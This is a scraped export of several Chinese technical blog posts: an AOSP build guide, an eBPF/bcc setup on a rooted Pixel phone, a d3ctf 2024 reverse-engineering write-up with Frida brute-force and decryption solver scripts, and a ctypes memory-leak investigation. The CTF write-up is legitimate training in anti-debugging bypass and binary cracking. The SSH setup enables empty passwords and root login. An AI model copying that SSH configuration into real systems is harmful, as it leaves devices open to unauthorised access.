android-platform &amp;&amp; cd android-platformrepo init -u https://android.googlesource.com/platform/manifest -b android-12.0.0_r34 --depth=1repo sync -j4# 安卓系统编译 在源码下载完成之后，我们首先使用 envsetup.sh 设置构建环境 source build/envsetup.sh之后使用 lunch 命令选择目标，我们可以直接输入 lunch 来查看可供编译的编译 lunch在 google 设备代号中可以知道 pixel3 的设备代号是 blueline 所以我们可以直接使用如下命令设置好编译目标 lunch aosp_blueline-userdebug这里出现了 Build sandboxing disabled due to nsjail error 报错，这个报错应该是不会影响后续的系统编译的 lunch自定义命令组合 lunch product_name-release-build_variant此字符串的组成部分包括： product_name 是我们要构建的产品的名称，例如 aosp_cf_x86_64_phone 或 aosp_husky 。特定的 product_name 可以遵循我们自己的设备格式，但 Google 为其设备采用的格式包含以下组件： aosp 是指 Android 开源平台。 （可选）如果要在 Cuttlefish 模拟器中运行目标，则包含 cf 。 架构和硬件（代号），例如 x86_64_phone 或 husky （Pixel 8 Pro 的代号）。如需查看 Google 设备的代号列表，请参阅设备代号。 所以对于 pixel3 来说，我们可以将 product_name 配置为 aosp_blueline 将 release 设置为 trunk_staging 。 此字符串的 build_variant 部分可以是下表中的三个值之一，这里我选择 user 为目标来构建，毕竟谁知道万一编译成 debug 会不会有 app 检测到特征了嘞～ build_variant 概述 说明 ro.secure ro.debuggable ro.kernel.android.checkjni adb 功能 Proguard 混淆器 DEXPREOPT 预先编译优化 user release 版本 此 build 变体提供有限的安全访问权限，适用于生产环境。 设定属性 ro.secure=1，打开安全检查功能 设定属性 ro.debuggable=0，关闭应用调试功能 设定属性 ro.kernel.android.checkjni=0，关闭 JNI 调用检查 关闭 打开 打开 userdebug 部分 debug 版本 此 build 变体可帮助设备开发者了解开发中版本的性能和功耗。使用 userdebug build 进行开发时，请遵循 userdebug 指南。 设定属性 ro.secure=1，打开安全检查功能 设定属性 ro.debuggable=1，启用应用调试功能 设定属性 ro.kernel.android.checkjni=0，关闭 JNI 调用检查 打开 打开 打开 eng debug 版本 此 build 变体的构建时间更短，如果您不在意性能和功耗，它最适合用于日常开发。 设定属性 ro.secure=0，关闭安全检查功能 设定属性 ro.debuggable=1，启用应用调试功能 设定属性 ro.kernel.android.checkjni=1，启用 JNI 调用检查 打开 关闭 关闭 所以对于我的 pixel3 来说编译命令如下 lunch aosp_blueline-trunk_staging-user但是没想到的是竟然报错了？估计是不能以 user 作为目标编译？之后看看 userdebug 会不会被检测到再决定是否继续研究此处的报错 然后开始编译，给虚拟机分配 12 核的话第一次大概需要两个小时左右可以编译完成，后面再次编译的速度就很快了 make -j8编译完成后会生成一个 vbmeta.img 文件，到时候我们要刷入的也是这一个文件 # 编译后的镜像刷入手机 //TODO 6.24 号周一的时候刷进去试试看功能是不是正常！# 参考资料 构建 Android Android 编译选项 eng、user、userdebug 的区别","categories":[],"tags":[]},{"title":"EBPF android bcc初体验","slug":"android-bcc","date":"2024-05-07T07:31:28.000Z","updated":"2025-04-08T18:55:11.436Z","comments":true,"path":"android-bcc/","link":"","permalink":"https://oacia.dev/android-bcc/","excerpt":"","text":"pixel6 到手的第一件事，当然是去玩玩看 ebpf 了～ebpf 的无痕 hook 听上去就感觉相当的强大，去官网看了一下 ebpf 知名度排名前几的项目，那非 bcc 莫属了，用 python 就可以运行 ebpf 代码，虽然 ebpf 的核心代码还是 C 写的，但是用 python 去执行就感觉十分的舒适 在网上也找到了三篇非常详细的 Android bcc 编译教程，前人种树，后人乘凉 ^.^ 可以试试看 ebpf 究竟是什么样子的啦 eBPF on Android 之 bcc 环境准备 ——eadb 原版 [原创] 60 秒学会用 eBPF-BCC hook 系统调用 ( 2 ) hook 安卓所有 syscall eBPF on Android 之 bcc 编译与体验 # bcc 环境搭建 接下来进行 bcc 的环境搭建，我们将使用 eadb 在手机中配置 Debian 系统，并通过 ssh 让 Windows 上的 vscode 可以连接手机中的 Debian 想要使用 bcc 的全部功能，首先检查 linux 内核版本，我的内核版本为 5.10 uname -a然后检查 BPF 的配置是否开启 oriole:/ # zcat /proc/config.gz | grep PROBECONFIG_GENERIC_IRQ_PROBE=yCONFIG_ARCH_SUPPORTS_UPROBES=yCONFIG_KPROBES=yCONFIG_UPROBES=yCONFIG_KRETPROBES=yCONFIG_HAVE_KPROBES=yCONFIG_HAVE_KRETPROBES=y# CONFIG_TEST_ASYNC_DRIVER_PROBE is not setCONFIG_GENERIC_CPU_AUTOPROBE=yCONFIG_TIMER_PROBE=yCONFIG_KPROBE_EVENTS=yCONFIG_UPROBE_EVENTS=yCONFIG_PROBE_EVENTS=y# CONFIG_BPF_KPROBE_OVERRIDE is not set# CONFIG_KPROBE_EVENT_GEN_TEST is not set随后使用 magisk root 手机，然后安装 MagiskSSH ubuntu 中在 root 权限下安装 adb 和 fastboot apt install adb,fastboot随后在 ubuntu 中输入下列命令生成 rsa 密钥，一路回车 ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"将公钥推送到手机中 adb push ~/.ssh/id_rsa.pub /data/local/tmp将公钥追加写入 MagiskSSH 的配置文件中 cat /data/local/tmp/id_rsa.pub >> /data/ssh/shell/.ssh/authorized_keyschmod 600 /data/ssh/shell/.ssh/authorized_keyscat /data/local/tmp/id_rsa.pub >> /data/ssh/root/.ssh/authorized_keyschmod 600 /data/ssh/root/.ssh/authorized_keys使用 MT 管理器编辑 /data/ssh/sshd_config , 把下面的内容粘贴到文件开头并保存即可 Port 22225PasswordAuthentication yesPermitEmptyPasswords yesPermitUserEnvironment yes 重启 sshd 服务 /data/adb/modules/ssh/opensshd.init stop/data/adb/modules/ssh/opensshd.init start随后在 ubuntu 中下载 eadb 和 debianfs 在手机的 WLAN 网络详情里找到手机热点的 IP 地址 配置 debian 环境 ./eadb --ssh root@192.168.50.191 -p 22225 prepare -a debianfs-arm64-full.tar.gz然后运行下面的命令就可以连接上了 ./eadb --ssh root@192.168.50.191 -p 22225 shell为 Debian 配置 ssh apt-get updateapt-get install ssh打开 /etc/ssh/sshd_config vim /etc/ssh/sshd_config并按下 ctrl+shift+v 粘贴下列的内容 AuthorizedKeysFile .ssh/authorized_keysPort 11111PubkeyAuthentication yesPermitRootLogin yesPasswordAuthentication yesGSSAPIAuthentication no # 加速SSHUseDNS no # 加速SSH在虚拟机 ubuntu 中查看生成的公钥 cat ~/.ssh/id_rsa.pub在手机 Debian 中手动粘贴导入公钥 vim id_rsa.pub在手机 Debian 中增加公钥并配置权限 cat id_rsa.pub >> ~/.ssh/authorized_keyschmod 600 ~/.ssh/authorized_keys;chmod 700 ~/.sshservice ssh restart # 手机每次重启后，第一次进入 debian, 可能都需要手动启动下 ssh 服务 如果没有 ~/.ssh/authorized_keys 文件，新建一个就行了 mkdir ~/.ssh;touch ~/.ssh/authorized_keys 修改 Debian 的 root 密码 passwd root在 ubuntu 中查看私钥，然后复制到 Windows 的一个文件 id_rsa 中 cat ~/.ssh/id_rsa然后打开 C:\\Users\\admin\\.ssh\\config , 配置 ssh, 并在 vscode 中安装 ssh 插件 之后关闭虚拟机让手机的 USB 连上 Windows, 在 vscode 中就可以连上啦 vscode 第一次连接 Debian, 会在 Debian 中安装 vscode 服务器，如果不开代理的话速度会相当相当的慢，要想给 Debian 挂代理的话，只要在手机中把 Clash 开起来就可以啦 # bcc 编译运行 环境搭建好了之后，就可以编译 bcc 了 先把 bcc 下过来 git clone https://github.com/iovisor/bcc.git编译 bcc mkdir bcc/build; cd bcc/buildcmake ..make我在编译的过程中遇到了如下的报错 先装个 pip wget https://bootstrap.pypa.io/get-pip.pypython get-pip.py然后再安装 setuptools wget https://files.pythonhosted.org/packages/af/e7/02db816dc88c598281bacebbb7ccf2c9f1a6164942e88f1a0fded8643659/setuptools-45.0.0-py2.py3-none-any.whlpip install setuptools-45.0.0-py2.py3-none-any.whl后来又报错 zip 没安装 装一个 zip apt-get install zip重新 make 之后编译成功～ 然后把 bcc 安装一下 make install随后再编译一下 python 的 bcc cmake -DPYTHON_CMD=python3 ..pushd src/python/makemake installpopd试试看官方的例子 python3 bcc/examples/hello_world.py结果竟然没输出？ 哈哈，原来是 tracing 的开关没开，开一下 echo 1 > /sys/kernel/tracing/tracing_onHello, World! # 参考资料 eBPF on Android 之 bcc 环境准备 ——eadb 原版 [原创] 60 秒学会用 eBPF-BCC hook 系统调用 ( 2 ) hook 安卓所有 syscall eBPF on Android 之 bcc 编译与体验","categories":[],"tags":[]},{"title":"d3ctf2024 reverse wp","slug":"d3ctf-2024","date":"2024-04-28T16:12:07.000Z","updated":"2025-04-08T18:55:11.488Z","comments":true,"path":"d3ctf-2024/","link":"","permalink":"https://oacia.dev/d3ctf-2024/","excerpt":"","text":"# 前言 已经是四月底了，但是却突然发现这一整个月都没有在博客写些什么，感觉又是在不明所以中度过了，想看的 magisk , frida 源码没有看完，想做的小夏的 live2d 也迟迟没有动工，下个月努努力，多学点，多做点，加油加油 总觉得自己还是要写下点什么才好，恰好这周听闻有个 d3ctf, 于是便想来看看逆向题，去学习一下新知识开拓视野，同时也为了度过一段充实的周末时光 回想去年的 d3ctf, 感觉那时的自己有太多不了解的地方了，于是乎情理之中的也是一题都没做出来了，复现的题目的计划在我的 todolist 里面躺了很长一段时间，然而不知不觉间变成了 undo, 最后到现在的 forget do,never do 同时我也想来看看一下这一年的自己有了什么变化，感觉现在可以称自己是一位入门逆向工程师了吧哈哈哈，总共五道逆向题做好了三题，可惜周日因为要调休的缘故 (谁发明的调休？！) 便没有再继续看题了，题目挺不错的，不过要是可以有安卓题的话我应该会有百分之三百的精气神去做吧 ^.^ 翻了翻自己过去写的 ctf 文章，那也仅仅是 wp 出个 flag 而已，但是 flag 不是题目的终点，二进制文件中蕴藏的技巧，手法才是真正值得总结一篇文章的地方，我可不希望自己写的文章在未来连我自己都不愿重新翻看 (●ˇ∀ˇ●) 题目附件点这里下载～ # forest 很好的一道题，将 MSVC 的 SEH 异常处理使用的十分巧妙，同时点和图的思想也在这题有了充分的体现，在做这题的时候有一个失败的解法，不过我感觉很有意思所以也在这里记录下来啦 这里你会看到地址都是 61 开头，那时因为用 od 的时候里面的基址就是 0x610000 , 所以当时为了和 ida 中对应起来我也改成了 61 开头，不过最后 od 还是没有排上用场全靠 ida 动态调试啦 这里通过主动设置 int 3 断点触发 0x80000003 断点异常进入 sub_611A00 在 sub_611A00 中，对异常码进行判断，这里可以重定义 this 参数类型为 _EXCEPTION_POINTERS , 这样看起来更方便些，感觉是一个小小的突破口哦 首次触发断点异常，解密由 VirtualProtect 分配的内存地址的值，并设置 byte_616028 标志为 0, 下一次触发断点异常将视为 flag 错误，进程退出 解密完成后设置 EIP, 并通过 this-&gt;ContextRecord-&gt;EFlags |= 0x100 设置单步调试模式，使标志寄存器第 8 位 TF 为 1 随后程序会通过调用 cli 特权指令实现 shellcode 的跳转 int 2Dh 表示 flag 错误 # [失败] frida 侧信道 说的高大上一点叫侧信道，实际上就是爆破哈哈哈，我调试的时候发现每一次输入的 flag 不一样，调用 cli 特权指令触发 0xC0000096 的次数也不一样，所以我就在想，要是我可以一位一位的爆破，通过在处理 0xC0000096 异常的地方下断点统计调用次数，然后然调用最多的那个字符作为这一位的 flag, 那不就得到最后的 flag 了嘛～ 所以这回用上了我的老伙计 frida, 想要通过 frida 实现爆破，那么需要使用 frida 的 python 脚本，同时输入也不能再是 console.log , 而是需要使用 send 将结果返回到 python 中去做处理 function my_hook() &#123; var module = Process.findModuleByName(exe_name); Interceptor.attach(module.base.add(0x1BDE), &#123; onEnter: function (args) &#123; if(this.context.eax.compare(0xC0000096)===0)&#123; count=count+1 //console.log(this.context.eax) //console.log(ptr(module.base.add(0xAD20).readS32()).readS32().toString(16)) //console.log(ptr(module.base.add(0xAD24).readS32()).readS32().toString(16)) send(count) &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125; );&#125;// d3ctf&#123;01234567890123456&#125;setImmediate(my_hook);这个 python 的代码虽然很简单但是也巧妙，嘻嘻 import osimport subprocessimport fridaimport string#d3ctf&#123;0ut00431101002001&#125;def on_message(message, data): global max_count,max_ch,current_ch if message['type'] == 'send': if not max_count: max_count = int(message['payload']) max_ch = current_ch elif int(message['payload'])>max_count: max_count = message['payload'] max_ch = current_ch elif int(message['payload'])==max_count: print(f\"NOTE! &#123;max_ch&#125; and &#123;current_ch&#125; have the same max_count &#123;max_count&#125;\") elif message['type'] == \"error\": print(message[\"description\"]) print(message[\"stack\"]) print(message[\"fileName\"], \"line:\", message[\"lineNumber\"], \"colum:\", message[\"columnNumber\"])jscode = open(\"trace_forest.js\",\"rb\").read().decode()t_flag = list(\"d3ctf&#123;01234567890123456&#125;\")for i in range(6,23): max_count, max_ch = None,None break_flag = 0 for c in string.printable: current_ch = c t_flag[i] = c process = subprocess.Popen(\"forest.exe\", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) session = frida.attach(\"forest.exe\") script = session.create_script(jscode) script.on('message', on_message) script.load() process.stdin.write(''.join(t_flag)) output, error = process.communicate() process.terminate() t_flag[i] = max_ch print(f\"&#123;''.join(t_flag)&#125;, max: &#123;max_count&#125;\")但是可惜的是程序跑完出来了这个 d3ctf&#123;0ut00431101002001&#125; , 虽然是错的但是回显不一样了 ^.^ 这何尝不是一种胜利～不过换个方法咯 # [成功] 图 点 路径 如果想要产生正确的回显，必须触发 0xC0000005 异常 输入的字符串将会被全部转换为二进制的形式，每执行 cli 特权指令触发 0xC0000096 异常后都会读取一位 如果为 0, 则下一次触发 0x80000004 单步调试异常且当前指令的偏移逻辑 &amp;0x3F 等于 7 时，将会让当前的 Eip 加上 23 进入下一个块的位置由 unk_EAA720 和 unk_EA8658 进行控制，算法为 (unk_EAA720+unk_EA8658+(unk_EA8658&lt;&lt;4))&lt;&lt;6 观察后发现这明显就是一个图呀，所以可以用 idapython 找到图的所有边 # d3ctf&#123;0ut00431101002001&#125;import idautilsimport idcimport ida_bytesbase = 0x616035pattern = [\"B8 FF FF FF FF C7 00 ?? 00 00 00 B8 FF FF FF FF C7 00 ?? 00 00 00 FA\"]pl = [] # point listfor i in range(len(pattern)): cur_addr = 0x616035 end_addr = 0x616035 + 0x483D while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) if cur_addr == idc.BADADDR: break else: a = ida_bytes.get_byte(cur_addr + 7) b = ida_bytes.get_byte(cur_addr + 18) pl.append(&#123; \"cur\": cur_addr, \"off\": (a + b + (b &lt;&lt; 4)) &lt;&lt; 6, \"s\": 0 &#125;) cur_addr = idc.next_head(cur_addr)pattern = [\"8B 00\"]for i in range(len(pattern)): cur_addr = 0x616035 end_addr = 0x616035 + 0x483D while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) if cur_addr == idc.BADADDR: break else: # if cur_addr-(base+5) &amp;0x3F==7,eax->1, eip+23 pl.append(&#123; \"cur\": cur_addr, \"off\": cur_addr + 23 - base, \"s\": 1 &#125;) cur_addr = idc.next_head(cur_addr)print(pl)然后打印一下没有对应端点的点，这里只是部分，实际上还有很多… 之后一个一个试过去，就有 flag 了 (为什么不用 for 循环尝试所有可能的点，因为用 for 循环 all_simple_paths 不出结果呜) base = 0x616035pl = [...]# ida python 的结果import networkx as nxG = nx.DiGraph()for p in pl: G.add_node(p[\"cur\"])out_way = []for p in pl: if not p[\"s\"]: if G.has_node(base+p[\"off\"]): G.add_edge(p[\"cur\"],base+p[\"off\"]) else: if base+p['off']>0x616035 + 0x483D: print(f\"find a way out: &#123;hex(p['cur'])&#125; --> &#123;hex(base+p['off'])&#125;\") G.add_node(base+p['off']) G.add_edge(base,base+p['off']) out_way.append(base+p['off']) else: print(f\"no taget point: &#123;hex(p['cur'])&#125; --> &#123;hex(base + p['off'])&#125;\") out_way.append(base + p['off']) else: if G.has_node(p[\"cur\"]+2+23): G.add_edge(p[\"cur\"],p[\"cur\"]+2+23) if G.has_node(p[\"cur\"]+2): G.add_edge(p[\"cur\"], p[\"cur\"] + 2) else: print(\"ERRR\")start = 0x616035tem = []out = 0x616c0efor path in nx.all_simple_paths(G, source=start, target=out): tem.append(path) #print(tem) #print(len(tem[0])) pll = [] for t in tem[0]: for p in pl: if p[\"cur\"]==t: #print(p[\"cur\"],p[\"s\"]) pll.append(p) break start = True flag=\"\" for p in range(len(pll)): if p!=0: if not pll[p][\"s\"]: if pll[p][\"cur\"]-pll[p-1][\"cur\"]==2: flag+=\"0\" else: flag+=\"1\" for i in range(0,len(flag)//8): print(chr(int(flag[8*i:8*i+8],2)),end='')# ezjunk 从整个程序的入口 start 函数开始分析，在执行 main 函数前，还会调用 sub_401CC0 函数 在这个函数中，会对 sub_401550 进行调用 但是却没法直接反编译，既然是栈的问题，把 sub rsp, 30h nop 掉就好啦 有个反调试，过一下就好了 main 函数的花指令也很简单，去一下就看到逻辑啦 进到 sub_401917 里面，只是一个 tea 算法 之后就是一个类似 crc 的算法 不过在调试的时候还是不能直接把花指令 nop 掉的，因为这里读取的是 loc401A1C 花指令的汇编，如果 nop 掉变成 90 的话，tea 的常数值会出错的 from ctypes import *def encrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0xff58f981 total = c_uint32(0xE8017300) for i in range(32): v0.value += (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) ^ 0x44 v1.value += (((v0.value &lt;&lt; 5) ^ (v0.value >> 6)) + v0.value) ^ ( total.value + key[(total.value >> 11) &amp; 3]) ^ 0x33 total.value -= delta return v0.value, v1.valuedef decrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0xff58f981 total = c_uint32(0xE8017300 - 32 * delta) for i in range(32): total.value += delta v1.value -= (((v0.value &lt;&lt; 5) ^ (v0.value >> 6)) + v0.value) ^ ( total.value + key[(total.value >> 11) &amp; 3]) ^ 0x33 v0.value -= (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) ^ 0x44 return v0.value, v1.value# testif __name__ == \"__main__\": # 待加密的明文，两个 32 位整型，即 64bit 的明文数据 # fakeflag&#123;Is_there_anywhere_else&#125; # value = [0x5406CBB1, 0xA4A41EA2, 0x34489AC5, 0x53D68797, 0xB8E0C06F, 0x0259F2DB, 0x52E38D82, 0x595D5E1D] value = [0xB6DDB3A9, 0x36162C23, 0x1889FABF, 0x6CE4E73B, 0x0A5AF8FC, 0x21FF8415, 0x44859557, 0x2DC227B7] value = [c_uint(v) for v in value] for i in range(len(value)): for _ in range(32): if value[i].value&amp;1: value[i] = c_uint(((value[i].value ^ 0x84A6972F)//2) | 0x80000000)#2086826726 else: value[i] = c_uint((value[i].value//2)) value = [v.value for v in value] #for v in value: #print(hex(v)) # value = [] # 四个 key，每个是 32bit，即密钥长度为 128bit key = [0x00005454, 0x00004602, 0x00004477, 0x00005E5E] v = [0, 0] for i in range(len(value) // 2): v[0], v[1] = value[2 * i], value[2 * i + 1] res = decrypt(v, key) print(f\"&#123;res[0].to_bytes(4, 'little').decode()&#125;&#123;res[1].to_bytes(4, 'little').decode()&#125;\", end='')# RandomVM VM 题型，不过算是比较方便的那种真正用到的指令不是很多，ida trace 在关键函数 trace 一下，不过有个 ptrace 反调试注意一下就好啦 syscall (0x65) ptrace 反调试，跳过这条指令就好了 比较重要的有这些函数 idapython trace 一下 #xorimport idcimport ida_bytesimport idaapiea = ida_bytes.get_byte(idaapi.get_imagebase()+0xB072)ecx=idc.get_reg_value(\"ECX\")eax=idc.get_reg_value(\"EAX\")print(f\"final[&#123;ea&#125;] = &#123;hex(ecx)&#125;^&#123;hex(eax)&#125; = &#123;hex(ecx^eax)&#125;\")#movimport idcimport ida_bytesimport idaapiea = ida_bytes.get_byte(idaapi.get_imagebase()+0xB072)eax=idc.get_reg_value(\"EAX\")print(f\"final[&#123;ea&#125;] = &#123;hex(eax)&#125;\")#circleRmovimport idcimport ida_bytesimport idaapiimport ctypesea = ida_bytes.get_byte(idaapi.get_imagebase()+0xB072)edx=idc.get_reg_value(\"EDX\")ecx=idc.get_reg_value(\"ECX\")%8res = ctypes.c_uint8(edx)if ecx!=0xffffffff: res = ctypes.c_uint8((res.value>>ecx) | (res.value&lt;&lt;(8-ecx)))else: res = ctypes.c_uint8(0)print(f\"final[&#123;ea&#125;] = &#123;hex(edx)&#125;>>&#123;ecx&#125; | &#123;hex(edx)&#125;&lt;&lt;&#123;8-ecx&#125; = &#123;hex(res.value)&#125;\")输入 0123456789ab 得到输出 final[0] = 0x0^0x30 = 0x30final[1] = 0x1final[1] = 0x30>>3 | 0x30&lt;&lt;5 = 0x6final[1] = 0x6^0x3 = 0x5final[1] = 0x5^0x31 = 0x34final[2] = 0x2final[2] = 0x31>>5 | 0x31&lt;&lt;3 = 0x89final[2] = 0x89^0x32 = 0xbbfinal[3] = 0x3final[3] = 0x32>>6 | 0x32&lt;&lt;2 = 0xc8final[3] = 0xc8^0x33 = 0xfbfinal[4] = 0x4final[4] = 0x33>>7 | 0x33&lt;&lt;1 = 0x66final[4] = 0x66^0x7 = 0x61final[4] = 0x61^0x34 = 0x55final[5] = 0x5final[5] = 0x34>>4 | 0x34&lt;&lt;4 = 0x43final[5] = 0x43^0x4 = 0x47final[5] = 0x47^0x35 = 0x72final[6] = 0x6final[6] = 0x35>>4 | 0x35&lt;&lt;4 = 0x53final[6] = 0x53^0x36 = 0x65final[7] = 0x7final[7] = 0x36>>7 | 0x36&lt;&lt;1 = 0x6cfinal[7] = 0x6c^0x7 = 0x6bfinal[7] = 0x6b^0x37 = 0x5cfinal[8] = 0x8final[8] = 0x37>>7 | 0x37&lt;&lt;1 = 0x6efinal[8] = 0x6e^0x38 = 0x56final[9] = 0x9final[9] = 0x38>>2 | 0x38&lt;&lt;6 = 0xefinal[9] = 0xe^0x39 = 0x37final[10] = 0xafinal[10] = 0x39>>4 | 0x39&lt;&lt;4 = 0x93final[10] = 0x93^0x61 = 0xf2final[11] = 0xbfinal[11] = 0x61>>4 | 0x61&lt;&lt;4 = 0x16final[11] = 0x16^0x62 = 0x74final[12] = 0xcfinal[12] = 0x62>>7 | 0x62&lt;&lt;1 = 0xc4final[12] = 0xc4^0x7 = 0xc3final[2] = 0xbb^0x34 = 0x8ffinal[3] = 0xfb^0x8f = 0x74final[4] = 0x55^0x74 = 0x21final[5] = 0x72^0x21 = 0x53final[6] = 0x65^0x53 = 0x36final[7] = 0x5c^0x36 = 0x6afinal[8] = 0x56^0x6a = 0x3cfinal[9] = 0x37^0x3c = 0xbfinal[10] = 0xf2^0xb = 0xf9final[11] = 0x74^0xf9 = 0x8dfinal[12] = 0xc3^0x8d = 0x4eexp 如下 import ctypesdef circleR_rev(s, r): res = ctypes.c_uint8(s) res = ctypes.c_uint8((res.value &lt;&lt; r) | (res.value >> (8 - r))) return res.valuekey = [0x9D, 0x6B, 0xA1, 0x02, 0xD7, 0xED, 0x40, 0xF6, 0x0E, 0xAE, 0x84, 0x19]circle_R = [3, 5, 6, 7, 4, 4, 7, 7, 2, 4, 4, 7]xor = [3,0,0,7,4,0,7,0,0,0,0,7]flag = [0 for _ in range(12)]for i in range(len(key)-1,-1,-1): if not flag[-1]: flag[i] = circleR_rev(key[i]^key[i-1]^xor[i],circle_R[i]) else: flag[i] = circleR_rev(key[i]^key[i-1]^xor[i]^flag[i+1],circle_R[i]) if not i: flag[i] = circleR_rev(key[i]^xor[i]^flag[i + 1], circle_R[i])print(''.join(map(chr, flag)))","categories":[],"tags":[]},{"title":"记一次python ctypes.cast引起的内存泄漏","slug":"python-memory-leak","date":"2024-03-02T07:00:00.000Z","updated":"2025-04-08T18:55:11.727Z","comments":true,"path":"python-memory-leak/","link":"","permalink":"https://oacia.dev/python-memory-leak/","excerpt":"","text":"内存泄漏（英语：memory leak）是计算机科学中的一种资源泄漏，主因是计算机程序的内存管理失当 [1]，因而失去对一段已分配内存空间的控制，程序继续占用已不再使用的内存空间，或是存储器所存储之对象无法透过执行代码而访问，令内存资源空耗 [2]。 相信每一个敲过代码的朋友肯定都遇到过内存泄漏，对于 c 语言这种分配了内存却不会自己释放的语言来说，内存泄漏算是家常便饭了，但是我最近在写一个 python 代码的时候同样也遇到了内存泄漏，有朋友可能会问，python 这种自带内存回收机制的语言怎么还会内存泄漏呢？ 真相是… 我在 python 中调用了 c 编译出来的动态链接库，然后就内存泄漏了，而且这个泄漏点藏得相当之深，我排查了整整一整天才找到 -_-! # demo 下面是有内存泄漏的代码的 demo, 这个代码实现的功能很简单，就是在 main.py 中调用 double.dll 的导出函数 double_string , 实现的功能是传入一个字符串，返回的字符串是传入字符串的两倍，然而内存却在不断的增大 # double.c //gcc -fPIC -shared double.c -o double.dll#include &lt;stdlib.h>#include &lt;string.h>#include &lt;stdio.h>unsigned char *double_string(unsigned char *input,int len)&#123; unsigned char* double_input = malloc(2*len+1); strcpy(double_input, input); strcat(double_input, input); return double_input;&#125;# main.py # main.pyimport ctypesdll = ctypes.CDLL('./double.dll')c_double_string = dll.double_stringc_double_string.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_int]c_double_string.restype = ctypes.POINTER(ctypes.c_uint8)def call_C_func(_data: bytes) -> bytes: data = ctypes.create_string_buffer(_data) data = ctypes.cast(data, ctypes.POINTER(ctypes.c_uint8)) ret = c_double_string(data, len(_data)) _ret = ctypes.string_at(ret, len(_data) * 2) return _retwhile True: call_C_func(b\"abcd\")# 内存泄漏点一 这第一个泄漏点很明显，是在 double.c 中，因为在 double_string 中只有一个孤零零的 malloc , 但是却没有 free 陪着他，所以理所应当的就内存泄漏了 (malloc/realloc/colloc) 和 free 必须两两对应才不会导致内存泄漏，malloc 就是向系统申请一块指定大小的内存，free 则是向系统归还指定地址开始的一块内存 在 c++ 中， new和delete 或者 new[]和delete[] 也必须两两对应，才不会导致内存泄漏 但是这个 free 应该放在什么地方呢？首先肯定是不能在 double_string 中 free 的，不然好不容易把传进来的字符串处理好正准备作为返回值传回去，你反手一个 free 直接把返回值给 free 没了这怎么行呢 所以这个 free 的时机只能是在 main.py 中调用完 c_double_string 之后，python 中该怎么执行 free 函数呀 这该怎么办呢？ 让 c 导出一个释放内存的函数 c_free , 然后在 python 里面再去调用它不就好了 但是这样修改了之后，内存依然在不断的增加 # 内存泄漏点二 内存既然还在泄漏，并且 c 语言里面也没有泄漏点了，那么唯一还有可能的泄漏点就是在 python 中了 在 python 中调用了三个 ctypes 相关的函数，我们一个一个分析来看看有没有可能存在的内存泄漏 create_string_buffer 这个函数的功能是将 bytes 类型转换成 char[] 类型，可以看到， buf 变量的内存是通过 c_char * size 来分配的，由于内存是在 python 中分配，python 会自己把不用的内存回收掉，所以这里不会内存泄漏 string_at 这个函数的功能是从一个地址读取指定长度的字符串，它仅仅只是读数据所以根本就没有能力去导致内存泄漏 cast 嫌疑人 cast 终于出现了，它的功能是将一个数据转换成指定类型的数据 ctypes.cast(obj, type) 此函数类似于 C 的强制转换运算符。 它返回一个 type 的新实例，该实例指向与 obj 相同的内存块。 type 必须为指针类型，而 obj 必须为可以被作为指针来解读的对象。 找找这个函数在 python 中的实现是什么样子的 # Python39\\Lib\\ctypes\\__init__.pydef PYFUNCTYPE(restype, *argtypes): class CFunctionType(_CFuncPtr): _argtypes_ = argtypes _restype_ = restype _flags_ = _FUNCFLAG_CDECL | _FUNCFLAG_PYTHONAPI return CFunctionType_cast = PYFUNCTYPE(py_object, c_void_p, py_object, py_object)(_cast_addr)def cast(obj, typ): return _cast(obj, obj, typ)然后我们再去追踪 _cast_addr 的声明，发现 cast 是从 _ctypes.pyd 中导出的函数 但是 _ctypes.pyd 毕竟是已经编译过的二进制文件，而我们希望看到的是 cast 的源码，而它在 python 的 github 仓库中可以找到，cast 源码 static PyObject * cast(void *ptr, PyObject *src, PyObject *ctype)&#123; CDataObject *result; // 确保被转换的类型是一个指针 if (0 == cast_check_pointertype(ctype)) return NULL; result = (CDataObject *)_PyObject_CallNoArg(ctype); if (result == NULL) return NULL; /* The casted objects '_objects' member: It must certainly contain the source objects one. It must contain the source object itself. */ if (CDataObject_Check(src)) &#123; CDataObject *obj = (CDataObject *)src; CDataObject *container; /* PyCData_GetContainer will initialize src.b_objects, we need this so it can be shared */ container = PyCData_GetContainer(obj); if (container == NULL) goto failed; /* But we need a dictionary! */ if (obj->b_objects == Py_None) &#123; Py_DECREF(Py_None); obj->b_objects = PyDict_New(); if (obj->b_objects == NULL) goto failed; &#125; Py_XINCREF(obj->b_objects); result->b_objects = obj->b_objects; if (result->b_objects &amp;&amp; PyDict_CheckExact(result->b_objects)) &#123; PyObject *index; int rc; index = PyLong_FromVoidPtr((void *)src); if (index == NULL) goto failed; rc = PyDict_SetItem(result->b_objects, index, src); Py_DECREF(index); if (rc == -1) goto failed; &#125; &#125; /* Should we assert that result is a pointer type? */ memcpy(result->b_ptr, &amp;ptr, sizeof(void *)); return (PyObject *)result; failed: Py_DECREF(result); return NULL;&#125;这里的第 50 行有一个 memcpy , 作用是将 ptr 的地址赋值给 result-&gt;b_ptr , result-&gt;b_ptr 是经过类型转换之后指向转换后内存的指针，而这个变量 ptr 不就是 cast 传递进来的参数！？ 我们再来看看 cast 函数在 python 中的声明，这里定义了一个 cast , 返回的是 _cast , 而且我们居然发现参数 obj 竟然同时成为了 c 中 cast 的第一个参数 void *ptr 和第二个参数 PyObject *src , 而且这第一个参数和第二个参数的类型还不一样，分别是 c_void_p 和 py_object obj 明明是我们准备要类型转换的目标数据，怎么它幻化出了另外一个类型 void *ptr 来作为经过 cast 函数类型转换之后的内存指针呢？ 这就不得不说一下 python 中调用外部函数的一个机制了，即强制类型转换 argtypes 当调用外部函数时，每个实际参数都会被传给 argtypes 